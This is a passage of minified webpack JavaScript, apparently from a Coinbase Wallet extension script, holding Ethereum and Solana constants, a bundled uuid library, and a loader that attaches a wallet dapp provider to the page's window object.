            t.ETHEREUM_CURRENCY_DECIMAL = 18n,
            t.ETHEREUM_QR_CODE_MAINNET_SCHEME = "ethereum",
            t.BURN_ADDRESS = "0x000000000000000000000000000000000000dead",
            t.ETHEREUM_CHAIN_ID = 1n,
            t.POLYGON_CHAIN_ID = 137n
        }
        ,
        53610: (e,t)=>{
            Object.defineProperty(t, "__esModule", {
                value: !0
            }),
            t.LAMPORT_CURRENCY = t.SOLANA_CURRENCY_DECIMAL = t.BLOCKCHAIN_SOLANA_MAINNET_IMAGE_URL = t.LAMPORTS_PER_SOL = t.SOLANA_SYMBOL = t.NAME = void 0,
            t.NAME = "Solana",
            t.SOLANA_SYMBOL = "SOL",
            t.LAMPORTS_PER_SOL = 1000000000n,
            t.BLOCKCHAIN_SOLANA_MAINNET_IMAGE_URL = "https://assets.coingecko.com/coins/images/4128/small/Solana.jpg?1635329178",
            t.SOLANA_CURRENCY_DECIMAL = 9n,
            t.LAMPORT_CURRENCY = "lamport"
        }
        ,
        340674: (e,t)=>{
            Object.defineProperty(t, "__esModule", {
                value: !0
            }),
            t.yn = void 0,
            t.yn = function(e) {
                if (null == e)
                    return !1;
                const t = String(e).trim();
                return !!/^(?:y|yes|true|1|on)$/i.test(t)
            }
        }
        ,
        410189: (e,t,n)=>{
            n.r(t),
            n.d(t, {
                NIL: ()=>N,
                parse: ()=>d,
                stringify: ()=>s.Z,
                v1: ()=>u,
                v3: ()=>I,
                v4: ()=>g.Z,
                v5: ()=>m,
                validate: ()=>l.Z,
                version: ()=>S
            });
            var r, o, i = n(45302), s = n(120708), a = 0, c = 0;
            const u = function(e, t, n) {
                var u = t && n || 0
                  , l = t || new Array(16)
                  , d = (e = e || {}).node || r
                  , f = void 0 !== e.clockseq ? e.clockseq : o;
                if (null == d || null == f) {
                    var p = e.random || (e.rng || i.Z)();
                    null == d && (d = r = [1 | p[0], p[1], p[2], p[3], p[4], p[5]]),
                    null == f && (f = o = 16383 & (p[6] << 8 | p[7]))
                }
                var v = void 0 !== e.msecs ? e.msecs : Date.now()
                  , _ = void 0 !== e.nsecs ? e.nsecs : c + 1
                  , h = v - a + (_ - c) / 1e4;
                if (h < 0 && void 0 === e.clockseq && (f = f + 1 & 16383),
                (h < 0 || v > a) && void 0 === e.nsecs && (_ = 0),
                _ >= 1e4)
                    throw new Error("uuid.v1(): Can't create more than 10M uuids/sec");
                a = v,
                c = _,
                o = f;
                var E = (1e4 * (268435455 & (v += 122192928e5)) + _) % 4294967296;
                l[u++] = E >>> 24 & 255,
                l[u++] = E >>> 16 & 255,
                l[u++] = E >>> 8 & 255,
                l[u++] = 255 & E;
                var A = v / 4294967296 * 1e4 & 268435455;
                l[u++] = A >>> 8 & 255,
                l[u++] = 255 & A,
                l[u++] = A >>> 24 & 15 | 16,
                l[u++] = A >>> 16 & 255,
                l[u++] = f >>> 8 | 128,
                l[u++] = 255 & f;
                for (var y = 0; y < 6; ++y)
                    l[u + y] = d[y];
                return t || (0,
                s.Z)(l)
            };
            var l = n(858495);
            const d = function(e) {
                if (!(0,
                l.Z)(e))
                    throw TypeError("Invalid UUID");
                var t, n = new Uint8Array(16);
                return n[0] = (t = parseInt(e.slice(0, 8), 16)) >>> 24,
                n[1] = t >>> 16 & 255,
                n[2] = t >>> 8 & 255,
                n[3] = 255 & t,
                n[4] = (t = parseInt(e.slice(9, 13), 16)) >>> 8,
                n[5] = 255 & t,
                n[6] = (t = parseInt(e.slice(14, 18), 16)) >>> 8,
                n[7] = 255 & t,
                n[8] = (t = parseInt(e.slice(19, 23), 16)) >>> 8,
                n[9] = 255 & t,
                n[10] = (t = parseInt(e.slice(24, 36), 16)) / 1099511627776 & 255,
                n[11] = t / 4294967296 & 255,
                n[12] = t >>> 24 & 255,
                n[13] = t >>> 16 & 255,
                n[14] = t >>> 8 & 255,
                n[15] = 255 & t,
                n
            };
            function f(e, t, n) {
                function r(e, r, o, i) {
                    if ("string" == typeof e && (e = function(e) {
                        e = unescape(encodeURIComponent(e));
                        for (var t = [], n = 0; n < e.length; ++n)
                            t.push(e.charCodeAt(n));
                        return t
                    }(e)),
                    "string" == typeof r && (r = d(r)),
                    16 !== r.length)
                        throw TypeError("Namespace must be array-like (16 iterable integer values, 0-255)");
                    var a = new Uint8Array(16 + e.length);
                    if (a.set(r),
                    a.set(e, r.length),
                    (a = n(a))[6] = 15 & a[6] | t,
                    a[8] = 63 & a[8] | 128,
                    o) {
                        i = i || 0;
                        for (var c = 0; c < 16; ++c)
                            o[i + c] = a[c];
                        return o
                    }
                    return (0,
                    s.Z)(a)
                }
                try {
                    r.name = e
                } catch (e) {}
                return r.DNS = "6ba7b810-9dad-11d1-80b4-00c04fd430c8",
                r.URL = "6ba7b811-9dad-11d1-80b4-00c04fd430c8",
                r
            }
            function p(e) {
                return 14 + (e + 64 >>> 9 << 4) + 1
            }
            function v(e, t) {
                var n = (65535 & e) + (65535 & t);
                return (e >> 16) + (t >> 16) + (n >> 16) << 16 | 65535 & n
            }
            function _(e, t, n, r, o, i) {
                return v((s = v(v(t, e), v(r, i))) << (a = o) | s >>> 32 - a, n);
                var s, a
            }
            function h(e, t, n, r, o, i, s) {
                return _(t & n | ~t & r, e, t, o, i, s)
            }
            function E(e, t, n, r, o, i, s) {
                return _(t & r | n & ~r, e, t, o, i, s)
            }
            function A(e, t, n, r, o, i, s) {
                return _(t ^ n ^ r, e, t, o, i, s)
            }
            function y(e, t, n, r, o, i, s) {
                return _(n ^ (t | ~r), e, t, o, i, s)
            }
            const I = f("v3", 48, (function(e) {
                if ("string" == typeof e) {
                    var t = unescape(encodeURIComponent(e));
                    e = new Uint8Array(t.length);
                    for (var n = 0; n < t.length; ++n)
                        e[n] = t.charCodeAt(n)
                }
                return function(e) {
                    for (var t = [], n = 32 * e.length, r = "0123456789abcdef", o = 0; o < n; o += 8) {
                        var i = e[o >> 5] >>> o % 32 & 255
                          , s = parseInt(r.charAt(i >>> 4 & 15) + r.charAt(15 & i), 16);
                        t.push(s)
                    }
                    return t
                }(function(e, t) {
                    e[t >> 5] |= 128 << t % 32,
                    e[p(t) - 1] = t;
                    for (var n = 1732584193, r = -271733879, o = -1732584194, i = 271733878, s = 0; s < e.length; s += 16) {
                        var a = n
                          , c = r
                          , u = o
                          , l = i;
                        n = h(n, r, o, i, e[s], 7, -680876936),
                        i = h(i, n, r, o, e[s + 1], 12, -389564586),
                        o = h(o, i, n, r, e[s + 2], 17, 606105819),
                        r = h(r, o, i, n, e[s + 3], 22, -1044525330),
                        n = h(n, r, o, i, e[s + 4], 7, -176418897),
                        i = h(i, n, r, o, e[s + 5], 12, 1200080426),
                        o = h(o, i, n, r, e[s + 6], 17, -1473231341),
                        r = h(r, o, i, n, e[s + 7], 22, -45705983),
                        n = h(n, r, o, i, e[s + 8], 7, 1770035416),
                        i = h(i, n, r, o, e[s + 9], 12, -1958414417),
                        o = h(o, i, n, r, e[s + 10], 17, -42063),
                        r = h(r, o, i, n, e[s + 11], 22, -1990404162),
                        n = h(n, r, o, i, e[s + 12], 7, 1804603682),
                        i = h(i, n, r, o, e[s + 13], 12, -40341101),
                        o = h(o, i, n, r, e[s + 14], 17, -1502002290),
                        n = E(n, r = h(r, o, i, n, e[s + 15], 22, 1236535329), o, i, e[s + 1], 5, -165796510),
                        i = E(i, n, r, o, e[s + 6], 9, -1069501632),
                        o = E(o, i, n, r, e[s + 11], 14, 643717713),
                        r = E(r, o, i, n, e[s], 20, -373897302),
                        n = E(n, r, o, i, e[s + 5], 5, -701558691),
                        i = E(i, n, r, o, e[s + 10], 9, 38016083),
                        o = E(o, i, n, r, e[s + 15], 14, -660478335),
                        r = E(r, o, i, n, e[s + 4], 20, -405537848),
                        n = E(n, r, o, i, e[s + 9], 5, 568446438),
                        i = E(i, n, r, o, e[s + 14], 9, -1019803690),
                        o = E(o, i, n, r, e[s + 3], 14, -187363961),
                        r = E(r, o, i, n, e[s + 8], 20, 1163531501),
                        n = E(n, r, o, i, e[s + 13], 5, -1444681467),
                        i = E(i, n, r, o, e[s + 2], 9, -51403784),
                        o = E(o, i, n, r, e[s + 7], 14, 1735328473),
                        n = A(n, r = E(r, o, i, n, e[s + 12], 20, -1926607734), o, i, e[s + 5], 4, -378558),
                        i = A(i, n, r, o, e[s + 8], 11, -2022574463),
                        o = A(o, i, n, r, e[s + 11], 16, 1839030562),
                        r = A(r, o, i, n, e[s + 14], 23, -35309556),
                        n = A(n, r, o, i, e[s + 1], 4, -1530992060),
                        i = A(i, n, r, o, e[s + 4], 11, 1272893353),
                        o = A(o, i, n, r, e[s + 7], 16, -155497632),
                        r = A(r, o, i, n, e[s + 10], 23, -1094730640),
                        n = A(n, r, o, i, e[s + 13], 4, 681279174),
                        i = A(i, n, r, o, e[s], 11, -358537222),
                        o = A(o, i, n, r, e[s + 3], 16, -722521979),
                        r = A(r, o, i, n, e[s + 6], 23, 76029189),
                        n = A(n, r, o, i, e[s + 9], 4, -640364487),
                        i = A(i, n, r, o, e[s + 12], 11, -421815835),
                        o = A(o, i, n, r, e[s + 15], 16, 530742520),
                        n = y(n, r = A(r, o, i, n, e[s + 2], 23, -995338651), o, i, e[s], 6, -198630844),
                        i = y(i, n, r, o, e[s + 7], 10, 1126891415),
                        o = y(o, i, n, r, e[s + 14], 15, -1416354905),
                        r = y(r, o, i, n, e[s + 5], 21, -57434055),
                        n = y(n, r, o, i, e[s + 12], 6, 1700485571),
                        i = y(i, n, r, o, e[s + 3], 10, -1894986606),
                        o = y(o, i, n, r, e[s + 10], 15, -1051523),
                        r = y(r, o, i, n, e[s + 1], 21, -2054922799),
                        n = y(n, r, o, i, e[s + 8], 6, 1873313359),
                        i = y(i, n, r, o, e[s + 15], 10, -30611744),
                        o = y(o, i, n, r, e[s + 6], 15, -1560198380),
                        r = y(r, o, i, n, e[s + 13], 21, 1309151649),
                        n = y(n, r, o, i, e[s + 4], 6, -145523070),
                        i = y(i, n, r, o, e[s + 11], 10, -1120210379),
                        o = y(o, i, n, r, e[s + 2], 15, 718787259),
                        r = y(r, o, i, n, e[s + 9], 21, -343485551),
                        n = v(n, a),
                        r = v(r, c),
                        o = v(o, u),
                        i = v(i, l)
                    }
                    return [n, r, o, i]
                }(function(e) {
                    if (0 === e.length)
                        return [];
                    for (var t = 8 * e.length, n = new Uint32Array(p(t)), r = 0; r < t; r += 8)
                        n[r >> 5] |= (255 & e[r / 8]) << r % 32;
                    return n
                }(e), 8 * e.length))
            }
            ));
            var g = n(888767);
            function L(e, t, n, r) {
                switch (e) {
                case 0:
                    return t & n ^ ~t & r;
                case 1:
                case 3:
                    return t ^ n ^ r;
                case 2:
                    return t & n ^ t & r ^ n & r
                }
            }
            function C(e, t) {
                return e << t | e >>> 32 - t
            }
            const m = f("v5", 80, (function(e) {
                var t = [1518500249, 1859775393, 2400959708, 3395469782]
                  , n = [1732584193, 4023233417, 2562383102, 271733878, 3285377520];
                if ("string" == typeof e) {
                    var r = unescape(encodeURIComponent(e));
                    e = [];
                    for (var o = 0; o < r.length; ++o)
                        e.push(r.charCodeAt(o))
                } else
                    Array.isArray(e) || (e = Array.prototype.slice.call(e));
                e.push(128);
                for (var i = e.length / 4 + 2, s = Math.ceil(i / 16), a = new Array(s), c = 0; c < s; ++c) {
                    for (var u = new Uint32Array(16), l = 0; l < 16; ++l)
                        u[l] = e[64 * c + 4 * l] << 24 | e[64 * c + 4 * l + 1] << 16 | e[64 * c + 4 * l + 2] << 8 | e[64 * c + 4 * l + 3];
                    a[c] = u
                }
                a[s - 1][14] = 8 * (e.length - 1) / Math.pow(2, 32),
                a[s - 1][14] = Math.floor(a[s - 1][14]),
                a[s - 1][15] = 8 * (e.length - 1) & 4294967295;
                for (var d = 0; d < s; ++d) {
                    for (var f = new Uint32Array(80), p = 0; p < 16; ++p)
                        f[p] = a[d][p];
                    for (var v = 16; v < 80; ++v)
                        f[v] = C(f[v - 3] ^ f[v - 8] ^ f[v - 14] ^ f[v - 16], 1);
                    for (var _ = n[0], h = n[1], E = n[2], A = n[3], y = n[4], I = 0; I < 80; ++I) {
                        var g = Math.floor(I / 20)
                          , m = C(_, 5) + L(g, h, E, A) + y + t[g] + f[I] >>> 0;
                        y = A,
                        A = E,
                        E = C(h, 30) >>> 0,
                        h = _,
                        _ = m
                    }
                    n[0] = n[0] + _ >>> 0,
                    n[1] = n[1] + h >>> 0,
                    n[2] = n[2] + E >>> 0,
                    n[3] = n[3] + A >>> 0,
                    n[4] = n[4] + y >>> 0
                }
                return [n[0] >> 24 & 255, n[0] >> 16 & 255, n[0] >> 8 & 255, 255 & n[0], n[1] >> 24 & 255, n[1] >> 16 & 255, n[1] >> 8 & 255, 255 & n[1], n[2] >> 24 & 255, n[2] >> 16 & 255, n[2] >> 8 & 255, 255 & n[2], n[3] >> 24 & 255, n[3] >> 16 & 255, n[3] >> 8 & 255, 255 & n[3], n[4] >> 24 & 255, n[4] >> 16 & 255, n[4] >> 8 & 255, 255 & n[4]]
            }
            ))
              , N = "00000000-0000-0000-0000-000000000000";
            const S = function(e) {
                if (!(0,
                l.Z)(e))
                    throw TypeError("Invalid UUID");
                return parseInt(e.substr(14, 1), 16)
            }
        }
        ,
        45302: (e,t,n)=>{
            var r;
            n.d(t, {
                Z: ()=>i
            });
            var o = new Uint8Array(16);
            function i() {
                if (!r && !(r = "undefined" != typeof crypto && crypto.getRandomValues && crypto.getRandomValues.bind(crypto) || "undefined" != typeof msCrypto && "function" == typeof msCrypto.getRandomValues && msCrypto.getRandomValues.bind(msCrypto)))
                    throw new Error("crypto.getRandomValues() not supported. See https://github.com/uuidjs/uuid#getrandomvalues-not-supported");
                return r(o)
            }
        }
        ,
        120708: (e,t,n)=>{
            n.d(t, {
                Z: ()=>s
            });
            for (var r = n(858495), o = [], i = 0; i < 256; ++i)
                o.push((i + 256).toString(16).substr(1));
            const s = function(e) {
                var t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 0
                  , n = (o[e[t + 0]] + o[e[t + 1]] + o[e[t + 2]] + o[e[t + 3]] + "-" + o[e[t + 4]] + o[e[t + 5]] + "-" + o[e[t + 6]] + o[e[t + 7]] + "-" + o[e[t + 8]] + o[e[t + 9]] + "-" + o[e[t + 10]] + o[e[t + 11]] + o[e[t + 12]] + o[e[t + 13]] + o[e[t + 14]] + o[e[t + 15]]).toLowerCase();
                if (!(0,
                r.Z)(n))
                    throw TypeError("Stringified UUID is invalid");
                return n
            }
        }
        ,
        888767: (e,t,n)=>{
            n.d(t, {
                Z: ()=>i
            });
            var r = n(45302)
              , o = n(120708);
            const i = function(e, t, n) {
                var i = (e = e || {}).random || (e.rng || r.Z)();
                if (i[6] = 15 & i[6] | 64,
                i[8] = 63 & i[8] | 128,
                t) {
                    n = n || 0;
                    for (var s = 0; s < 16; ++s)
                        t[n + s] = i[s];
                    return t
                }
                return (0,
                o.Z)(i)
            }
        }
        ,
        858495: (e,t,n)=>{
            n.d(t, {
                Z: ()=>o
            });
            const r = /^(?:[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}|00000000-0000-0000-0000-000000000000)$/i;
            const o = function(e) {
                return "string" == typeof e && r.test(e)
            }
        }
    }
      , t = {};
    function n(r) {
        var o = t[r];
        if (void 0 !== o)
            return o.exports;
        var i = t[r] = {
            exports: {}
        };
        return e[r].call(i.exports, i, i.exports, n),
        i.exports
    }
    n.d = (e,t)=>{
        for (var r in t)
            n.o(t, r) && !n.o(e, r) && Object.defineProperty(e, r, {
                enumerable: !0,
                get: t[r]
            })
    }
    ,
    n.o = (e,t)=>Object.prototype.hasOwnProperty.call(e, t),
    n.r = e=>{
        "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(e, Symbol.toStringTag, {
            value: "Module"
        }),
        Object.defineProperty(e, "__esModule", {
            value: !0
        })
    }
    ;
    (()=>{
        const e = n(828088);
        function t() {
            window.coinbaseWallet?.dappProvider || (window.coinbaseWallet = window.coinbaseWallet || {},
            window.coinbaseWallet.dappProvider = new e.CoinbaseWalletDappProvider,
            window.addEventListener("beforeunload", (()=>{
                window.coinbaseWallet.dappProvider.disconnect(),
                delete window.coinbaseWallet.dappProvider
            }
            ), {
                once: !0
            }))
        }
        t()
    }
    )()
}
)();
//# sourceMappingURL=injectCoinbaseWalletDappProvider.js.map

})











